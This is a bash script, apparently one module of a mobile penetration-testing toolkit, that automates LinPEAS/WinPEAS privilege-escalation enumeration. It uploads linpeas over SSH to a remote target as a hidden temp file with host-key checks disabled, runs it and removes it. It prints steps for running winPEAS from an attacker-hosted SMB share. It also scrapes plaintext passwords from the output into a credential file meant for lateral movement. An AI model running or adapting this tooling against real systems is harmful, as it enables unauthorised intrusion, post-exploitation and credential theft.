#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "LINPEAS / WINPEAS" "PEASS-ng privilege escalation enumeration"

# ── Tool detection ─────────────────────────────────────────────────────────────
section "DEPENDENCIES"

_LINPEAS=""
_WINPEAS=""
for _n in linpeas linpeas.sh /usr/share/peass/linpeas/linpeas.sh; do
  command -v "$_n" &>/dev/null || [[ -f "$_n" ]] && { _LINPEAS="$_n"; break; }
done
for _n in winpeas winpeas.exe winPEASx64.exe winPEASany.exe /usr/share/peass/winpeas/winPEASx64.exe; do
  command -v "$_n" &>/dev/null || [[ -f "$_n" ]] && { _WINPEAS="$_n"; break; }
done

[[ -n "$_LINPEAS" ]] && \
  printf '  %s[✓]%s linpeas     %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$_LINPEAS" "${RESET}" || \
  printf '  %s[~]%s linpeas     not found\n' "${YELLOW}" "${RESET}"
[[ -n "$_WINPEAS" ]] && \
  printf '  %s[✓]%s winpeas     %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$_WINPEAS" "${RESET}" || \
  printf '  %s[~]%s winpeas     not found\n' "${YELLOW}" "${RESET}"

if [[ -z "$_LINPEAS" && -z "$_WINPEAS" ]]; then
  printf '\n  %s[!]%s No PEASS tools found. Install:\n' "${RED}" "${RESET}"
  printf '       %sapt install peass%s\n' "${DIM}" "${RESET}"
  printf '       %sor download from: github.com/carlospolop/PEASS-ng/releases%s\n' "${DIM}" "${RESET}"
  exit 1
fi

outdir="$(make_outdir)"
outfile="$outdir/linpeas.log"
: > "$outfile"

# ── Mode selection ─────────────────────────────────────────────────────────────
section "MODE"

if [[ -n "${SESSION_DIR:-}" ]]; then
  _mode=1   # local LinPEAS in pipeline mode
  _prof=3   # Network enum (-a -n) — most useful for lateral movement
  printf '  %s[CHAIN]%s Mode: LinPEAS local · Network profile  (pipeline auto-select)%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
else
  printf '\n'
  [[ -n "$_LINPEAS" ]] && printf '  %s[01]%s LinPEAS — local       (run on this NetHunter device)\n'  "${CYAN}" "${RESET}"
  [[ -n "$_LINPEAS" ]] && printf '  %s[02]%s LinPEAS — remote SSH  (upload + run on SSH target)\n'    "${CYAN}" "${RESET}"
  [[ -n "$_WINPEAS" ]] && printf '  %s[03]%s WinPEAS — show path   (manual upload to Windows target)\n' "${CYAN}" "${RESET}"
  printf '\n  %s>>%s Mode [1]: ' "${CYAN}" "${RESET}"
  read -r _mode; _mode="${_mode:-1}"
fi

case "$_mode" in

# ── LinPEAS local ──────────────────────────────────────────────────────────────
1)
  [[ -z "$_LINPEAS" ]] && { printf '  %s[!]%s linpeas not found\n' "${RED}" "${RESET}"; exit 1; }

  if [[ -z "${SESSION_DIR:-}" ]]; then
    printf '\n  %s[01]%s Fast          (-q  quick checks only)\n'       "${CYAN}" "${RESET}"
    printf '  %s[02]%s Full          (-a  all checks — slower)\n'        "${CYAN}" "${RESET}"
    printf '  %s[03]%s Network       (-a -n  includes network enum)\n'   "${CYAN}" "${RESET}"
    printf '  %s[04]%s Processes     (-a -p  process + cron enum)\n'     "${CYAN}" "${RESET}"
    printf '\n  %s>>%s Profile [1]: ' "${CYAN}" "${RESET}"
    read -r _prof; _prof="${_prof:-1}"
  fi

  _args=()
  case "$_prof" in
    1) _args=(-q)         ;;
    2) _args=(-a)         ;;
    3) _args=(-a -n)      ;;
    4) _args=(-a -p)      ;;
    *) _args=(-q)         ;;
  esac

  printf '\n  %s[*]%s Running LinPEAS locally — output goes to log and terminal.\n' "${CYAN}" "${RESET}"
  printf '  %s[*]%s This may take a few minutes...\n\n' "${DIM}" "${RESET}"

  run_fg "$_LINPEAS" "${_args[@]}" 2>&1 | tee -a "$outfile" || true
  ;;

# ── LinPEAS remote via SSH ─────────────────────────────────────────────────────
2)
  [[ -z "$_LINPEAS" ]] && { printf '  %s[!]%s linpeas not found\n' "${RED}" "${RESET}"; exit 1; }

  printf '  %s>>%s SSH host  (user@ip): '    "${CYAN}" "${RESET}"; read -r _ssh_host
  printf '  %s>>%s SSH port  [22]: '          "${CYAN}" "${RESET}"; read -r _ssh_port
  _ssh_port="${_ssh_port:-22}"
  printf '  %s>>%s Run full checks? (fast/full) [fast]: ' "${CYAN}" "${RESET}"; read -r _full
  _largs="-q"; [[ "${_full,,}" == "full" ]] && _largs="-a"

  printf '\n  %s[*]%s Uploading linpeas to %s%s%s...\n' "${CYAN}" "${RESET}" "${GREEN}" "$_ssh_host" "${RESET}"
  scp -P "$_ssh_port" -o StrictHostKeyChecking=no \
    "$_LINPEAS" "${_ssh_host}:/tmp/.linpeas_tmp.sh" 2>&1 | tee -a "$outfile"

  printf '  %s[*]%s Running remotely...\n\n' "${CYAN}" "${RESET}"
  # shellcheck disable=SC2029
  run_fg ssh -p "$_ssh_port" -o StrictHostKeyChecking=no "$_ssh_host" \
    "chmod +x /tmp/.linpeas_tmp.sh && /tmp/.linpeas_tmp.sh $_largs; rm -f /tmp/.linpeas_tmp.sh" \
    2>&1 | tee -a "$outfile" || true
  ;;

# ── WinPEAS path display ───────────────────────────────────────────────────────
3)
  [[ -z "$_WINPEAS" ]] && { printf '  %s[!]%s winpeas not found\n' "${RED}" "${RESET}"; exit 1; }

  printf '\n  %s[SYS]%s WinPEAS binary: %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_WINPEAS" "${RESET}"
  printf '\n  Upload to Windows target, then run:\n'
  printf '  %s  winPEASx64.exe quiet%s\n'   "${DIM}" "${RESET}"
  printf '  %s  winPEASx64.exe windowscreds%s\n' "${DIM}" "${RESET}"
  printf '  %s  winPEASx64.exe notcolor > out.txt%s\n\n' "${DIM}" "${RESET}"
  printf '  Via Evil-WinRM: upload winPEASx64.exe → Invoke-Binary winPEASx64.exe\n'
  printf '  Via Impacket:   impacket-smbserver share . -smb2support\n'
  printf '                  → on target: \\\\ATTACKER\\share\\winPEASx64.exe\n\n'
  printf '%s%s%s\n' "${DIM}" "$_WINPEAS" "${RESET}" >> "$outfile"
  ;;

*)
  printf '  %s[!]%s Invalid mode\n' "${RED}" "${RESET}"
  ;;
esac

printf '\n  %s[SYS]%s Log : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

# ── Pipeline chain: extract credential hints → chain_creds.txt ───────────────
if [[ -n "${SESSION_DIR:-}" ]] && [[ -f "$outfile" ]]; then
  sed 's/\x1b\[[0-9;]*[mGKHF]//g' "$outfile" 2>/dev/null \
    | grep -iE '(password|passwd|pwd)\s*[=:]\s*\S{3,}' \
    | grep -vEi '(PasswordAuthentication|password_strength|pass_through|bypass|password_file|password_length|password_required|no.password|nopassword|disabled|NOPASSWD|password_hash|password_policy|password_min|password_max|^\s*#|//\s*pass|\$password|%password)' \
    | while IFS= read -r _line; do
        _val=$(echo "$_line" | sed 's/.*[=:]\s*//;s/["'"'"'`]//g;s/\s.*//' | tr -d '\r\n')
        [[ ${#_val} -ge 3 && ${#_val} -le 64 ]] && \
          printf '[linpeas]    login: unknown   password: %s\n' "$_val"
      done >> "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
  sort -u "${SESSION_DIR}/chain_creds.txt" -o "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
  _cc=$(wc -l < "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || echo 0)
  [[ "$_cc" -gt 0 ]] && printf '  %s[CHAIN]%s chain_creds.txt: %s credential hint(s) from linpeas%s\n\n' \
    "${CYAN}" "${RESET}" "$_cc" "${RESET}"
fi

mark_done "$outdir"
